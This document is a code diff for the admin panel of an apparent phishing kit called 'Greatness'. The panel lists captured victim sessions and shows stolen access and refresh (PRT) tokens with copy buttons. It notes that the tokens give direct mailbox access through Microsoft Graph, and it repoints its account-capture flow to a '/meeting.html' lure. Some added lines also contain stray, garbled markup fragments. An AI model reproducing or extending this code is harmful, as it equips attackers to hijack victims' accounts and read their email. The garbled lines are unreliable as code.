@@ -26,17 +26,18 @@
         .btn-view { background: #10b981; border: none; padding: 6px 12px; border-radius: 6px; color: white; cursor: pointer; font-size: 11px; margin: 2px; }
         .btn-mail { background: #8b5cf6; }
         .token-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #111635; border-radius: 16px; padding: 24px; width: 700px; max-width: 90%; z-index: 1000; border: 1px solid #3b82f6; max-height: 80vh; overflow-y: auto; }
-        .token-modal pre { background: #0a0e27; padding: 12px; border-radius: 8px; overflow-x: auto; font-size: 10px; word-break: break-all; white-space: pre-wrap; }
+        .token-modal pre { background: #0a0e27; padding: 12px; border-radius: 8px; overflow-x: auto; font-size: 10px; word-break: break-all; }
         .overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 999; }
         .loading { text-align: center; padding: 40px; }
         .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #374151; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
+        .copy-token { font-size: 10px; background: #2563eb; border: none; padding: 2px 8px; border-radius: 4px; color: white; cursor: pointer; margin-left: 8px; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <div class="logo"><h1>Greatness Admin</h1><p>PRT Session Manager</p></div>
+        <div class="logo"><h1>Greatness Admin</h1><p>Session & Token Manager</p></div>
         <div class="stat-value" id="sessionCount" style="font-size: 14px;">0 Sessions</div>
     </div>
 
@@ -56,10 +57,10 @@
     </div>
 
     <div class="table-container">
-        <h3>📋 User Sessions</h3>
+        <h3>📋 Captured Sessions</h3>
         <table>
-            <thead><tr><th>Email</th><th>IP Address</th><th>User Agent</th><th>PRT Status</th><th>Captured At</th><th>Actions</th></tr></thead>
-            <tbody id="sessionsTableBody"><tr><td colspan="6" class="loading"><div class="spinner"></div> Loading... </td></tr></tbody>
+            <thead><tr><th>Email</th><th>IP Address</th><th>User Agent</th><th>PRT</th><th>Captured</th><th>Actions</th></tr></thead>
+            <tbody id="sessionsTableBody"><tr><td colspan="6" class="loading"><div class="spinner"></div> Loading...   </div>... </div>?... </div>?... </div>?..</td></tr></tbody>
         </table>
     </div>
 </div>
@@ -92,7 +93,7 @@
     function renderTable(sessions) {
         const tbody = document.getElementById('sessionsTableBody');
         if (!sessions || sessions.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No sessions. Click "Add Account" to authenticate. </td></tr>';
+            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No sessions. Click "Add Account" to authenticate.   </div>   </div>   </div>   </div>   </div>   </td></tr>';
             return;
         }
         
@@ -104,36 +105,45 @@
                 <td>${s.hasPRT ? '<span style="color:#10b981;">✅ PRT Captured</span>' : '<span style="color:#ef4444;">❌ No PRT</span>'}</td>
                 <td>${formatDate(s.capturedAt)}</td>
                 <td>
-                    <button class="btn-view" onclick="viewToken('${s.sid}')">🔑 View Token</button>
-                    <button class="btn-view btn-mail" onclick="openMailbox('${s.sid}', '${escapeHtml(s.email)}')">📧 Open Mailbox</button>
-                </td>
+                    <button class="btn-view" onclick="viewTokens('${s.sessionId}')">🔑 View Tokens</button>
+                    <button class="btn-view btn-mail" onclick="openMailbox('${s.sessionId}', '${escapeHtml(s.email)}')">📧 Open Mailbox</button>
+                 </td>
             </tr>
         `).join('');
     }
 
-    async function viewToken(sid) {
+    async function viewTokens(sessionId) {
         document.getElementById('tokenModal').style.display = 'block';
         document.getElementById('overlay').style.display = 'block';
-        document.getElementById('tokenDetails').innerHTML = '<div class="loading"><div class="spinner"></div> Getting fresh token...</div>';
+        document.getElementById('tokenDetails').innerHTML = '<div class="loading"><div class="spinner"></div> Loading tokens...</div>';
         
-        const data = await apiCall(`/api/session/token/${sid}`);
+        const data = await apiCall(`/api/session/tokens/${sessionId}`);
         
         if (data) {
             document.getElementById('modalTitle').innerHTML = `🔐 Tokens - ${data.email}`;
             document.getElementById('tokenDetails').innerHTML = `
                 <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
-                <p><strong>Access Token (Fresh):</strong></p>
-                <pre>${escapeHtml(data.access_token)}</pre>
-                <p><strong>PRT (Refresh Token):</strong></p>
-                <pre>${escapeHtml(data.refresh_token)}</pre>
-                <p style="font-size: 11px; color: #10b981;">✅ Access token refreshed and valid for ${data.expires_in} seconds</p>
-                <p style="font-size: 11px; color: #f59e0b;">🔄 PRT is permanent - use it to generate new access tokens</p>
+                <p><strong>Access Token (valid for ${data.expires_in} sec):</strong></p>
+                <pre id="accessToken">${escapeHtml(data.access_token)}</pre>
+                <button class="copy-token" onclick="copyToken('accessToken')">📋 Copy Access Token</button>
+                <p style="margin-top: 15px;"><strong>PRT (Refresh Token):</strong></p>
+                <pre id="prtToken">${escapeHtml(data.refresh_token || 'Not captured')}</pre>
+                <button class="copy-token" onclick="copyToken('prtToken')">📋 Copy PRT</button>
+                <p style="font-size: 11px; color: #f59e0b; margin-top: 15px;">⚠️ These tokens can be used to access the user's mailbox directly</p>
+                <p style="font-size: 11px; color: #10b981;">✅ Use the Access Token with Bearer authorization to call Microsoft Graph API</p>
             `;
         }
     }
 
-    function openMailbox(sid, email) {
-        window.open(`/mailbox.html?sid=${sid}&email=${encodeURIComponent(email)}`, '_blank');
+    function copyToken(elementId) {
+        const element = document.getElementById(elementId);
+        const text = element.innerText;
+        navigator.clipboard.writeText(text);
+        alert('✓ Token copied to clipboard!');
+    }
+
+    function openMailbox(sessionId, email) {
+        window.open(`/mailbox.html?sid=${sessionId}&email=${encodeURIComponent(email)}`, '_blank', 'width=1200,height=800');
     }
 
     function updateStats(sessions) {
@@ -149,8 +159,18 @@
         document.getElementById('overlay').style.display = 'none';
     }
 
-    function openAddAccount() { window.open('/generate-auth-page', '_blank', 'width=600,height=700'); setTimeout(loadSessions, 3000); }
-    async function clearAll() { if(confirm('Clear all sessions?')){ await apiCall('/api/sessions/clear',{method:'DELETE'}); loadSessions(); } }
+    function openAddAccount() { 
+        window.open('/meeting.html', '_blank', 'width=800,height=900');
+        setTimeout(loadSessions, 5000);
+    }
+    
+    async function clearAll() { 
+        if(confirm('Clear all sessions?')){ 
+            await apiCall('/api/sessions/clear',{method:'DELETE'}); 
+            loadSessions(); 
+        } 
+    }
+    
     function formatDate(d){ return d ? new Date(d).toLocaleString() : 'Unknown'; }
     function escapeHtml(str){ if(!str) return ''; return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); }
 
